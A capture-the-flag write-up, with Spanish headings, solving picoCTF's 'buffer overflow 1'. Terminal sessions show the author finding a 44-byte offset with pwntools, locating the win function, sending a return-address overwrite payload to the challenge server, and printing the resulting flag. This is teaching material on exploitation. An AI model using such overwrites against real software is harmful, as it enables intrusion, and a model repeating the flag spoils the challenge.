# buffer overflow 1



## Descripción
Control the return address

Additional details will be available after launching your challenge instance.

## Solución

``` bash
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls    
vuln  vuln.c
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ls -la
total 28
drwxr-xr-x 2 kali kali  4096 may 17 22:12 .
drwxr-xr-x 4 kali kali  4096 may 17 22:12 ..
-rw-r--r-- 1 kali kali 15704 may 17 22:12 vuln
-rw-r--r-- 1 kali kali   769 may 17 22:12 vuln.c
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ chmod +x vuln
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ ./vuln                     
Please enter your string: 
hhhhhhhhhooooooooooolllllllllllaaaaaaaa
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ python3        
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'K' + 44
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: can only concatenate str (not "int") to str
>>> 'K'*44
'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> 


``` 


``` bash
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'| ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ 

```

``` bash
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ objdump -D vuln -M intel | grep 'win'        
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$     
```

``` bash
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ echo 'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$  echo 'flag{dummienflag}' > flag.txt
                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ echo 'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dummienflag}
zsh: done                echo 'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ echo 'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK\xf6\x91\x04\x08' |  nc saturn.picoctf.net 51225 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_0195a40f}                                                                            
┌──(kali㉿kali)-[~/Descargas/BE]
└─$ 
```

## Bandera 
picoCTF{addr3ss3s_ar3_3asy_0195a40f}     

